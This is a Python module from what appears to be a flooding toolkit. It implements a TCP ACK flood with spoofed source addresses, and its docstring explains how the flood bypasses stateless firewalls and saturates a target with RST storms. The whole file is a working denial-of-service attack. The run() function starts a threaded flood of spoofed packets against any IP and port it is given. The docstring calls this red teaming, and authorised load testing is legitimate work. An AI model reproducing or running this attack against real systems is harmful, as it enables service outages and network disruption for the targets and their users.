"""
modules/ack_flood.py - UFOACK
TCP ACK flood. Targets stateless firewall bypass and server-side ACK handling.

How it works:
  Spoofed ACK packets with random seq/ack numbers.
  A stateful firewall knows these ACKs belong to no tracked session
  -> RST sent back by firewall/server = RST storm (doubles outbound load).

  A STATELESS firewall/ACL passes ACKs freely because:
    - Only SYN packets initiate connections
    - ACKs are assumed to belong to established sessions
  -> ACK flood bypasses naive ACL rules that block inbound SYN only.

  On the server:
    - Kernel processes the packet up to TCP layer
    - Sends RST (port closed) or drops (established session mismatch)
    - CPU cost per packet: ~same as SYN but no TCB allocated

Use case in red teaming:
  1. Test if target firewall is stateless (ACKs pass through freely)
  2. Generate RST storm toward victim (outbound bandwidth saturation)
  3. Combined with SYN flood: multi-vector Layer 4 pressure
"""

from floodles.core.packet_builder import PacketBuilder
from floodles.core.sender import FloodEngine


def run(
    dst_ip: str,
    dst_port: int,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
) -> FloodEngine:
    """
    Launch ACK flood.

    Args:
        dst_ip    : Target IP.
        dst_port  : Target TCP port.
        threads   : Worker count.
        pps_limit : PPS cap.
        duration  : Duration in seconds.
        spoof     : Randomize source IP (required for bypass effectiveness).

    Returns:
        FloodEngine (already started).
    """
    builder = PacketBuilder()

    def make_packet() -> bytes:
        return builder.ack(dst_ip, dst_port, spoof=spoof)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=dst_ip,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
